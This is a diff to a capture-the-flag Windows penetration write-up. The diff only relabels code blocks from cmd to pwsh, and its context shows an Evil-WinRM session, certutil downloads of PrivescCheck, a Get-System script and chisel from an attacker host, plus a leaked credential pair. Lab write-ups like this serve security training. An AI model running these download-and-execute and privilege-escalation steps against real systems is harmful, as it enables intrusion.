@@ -865,7 +865,7 @@ Info: Establishing connection to remote endpoint
 infiltrator\m.harris
 ```
 
-```cmd
+```pwsh
 *Evil-WinRM* PS C:\Users\M.harris\Documents> whoami /all
 
 USER INFORMATION
@@ -915,7 +915,7 @@ Kerberos support for Dynamic Access Control on this device has been disabled.
 
 Get the user flag first:
 
-```cmd
+```pwsh
 *Evil-WinRM* PS C:\Users\M.harris\Documents> cd ..\Desktop
 *Evil-WinRM* PS C:\Users\M.harris\Desktop> type user.txt
 •••flag-redacted•••
@@ -933,7 +933,7 @@ curl -Lo /var/www/html/PrivescCheck.ps1 https://github.com/itm4n/PrivescCheck/ra
 
 #### Download and run on target
 
-```cmd
+```pwsh
 *Evil-WinRM* PS C:\Users\M.harris\Documents> certutil.exe -urlcache -f -split http://10.10.14.35/PrivescCheck.ps1
 ****  Online  ****
   000000  ...
@@ -953,7 +953,7 @@ Script     0.0        PrivescCheck
 
 <details><summary>Full PrivescCheck Output</summary>
 
-```cmd
+```pwsh
 ┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
 ┃ CATEGORY ┃ TA0043 - Reconnaissance                           ┃
 ┃ NAME     ┃ User identity                                     ┃
@@ -1499,7 +1499,7 @@ curl -Lo /var/www/html/Privesc.psm1 https://github.com/PowerShellMafia/PowerSplo
 
 #### Download and run on target
 
-```cmd
+```pwsh
 *Evil-WinRM* PS C:\Users\M.harris\Documents> certutil.exe -urlcache -f -split http://10.10.14.35/Get-System.ps1
 ****  Online  ****
   0000  ...
@@ -1632,7 +1632,7 @@ Try to RunasCs with `k.turner`/`MessengerApp@Pass!` (fail):
 
 Let's see what ports are the target listening on
 
-```cmd
+```pwsh
 *Evil-WinRM* PS C:\Users\M.harris\Documents> netstat -ano | findstr LISTENING
   TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4
   TCP    0.0.0.0:88             0.0.0.0:0              LISTENING       624
@@ -1696,7 +1696,7 @@ mv chisel_${VERSION}_windows_amd64 /var/www/html/chisel.exe
 
 On Target:
 
-```cmd
+```pwsh
 *Evil-WinRM* PS C:\Users\M.harris\Documents> certutil.exe -urlcache -f -split http://10.10.14.35/chisel.exe
 ****  Online  ****
   000000  ...
